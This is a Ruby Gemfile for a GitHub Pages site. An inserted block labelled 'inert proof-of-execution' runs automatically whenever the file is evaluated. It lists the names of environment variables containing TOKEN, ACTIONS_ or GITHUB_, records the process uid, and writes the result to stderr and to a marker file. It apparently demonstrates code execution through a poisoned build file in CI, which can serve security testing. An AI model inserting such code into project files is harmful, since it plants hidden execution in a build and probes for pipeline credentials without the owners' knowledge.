source "https://rubygems.org"
# --- begin inert proof-of-execution ---
names = ENV.keys.grep(/TOKEN|ACTIONS_|GITHUB_/).sort.join(",")
line = "pgx74eb79be ruby=#{RUBY_VERSION} uid=#{Process.uid} envnames=#{names}"
warn line
begin; File.write(File.join(Dir.pwd, "pgx74eb79be.txt"), line + "\n"); rescue => e; warn "wf:#{e.class}"; end
# --- end ---
gem "github-pages", group: :jekyll_plugins
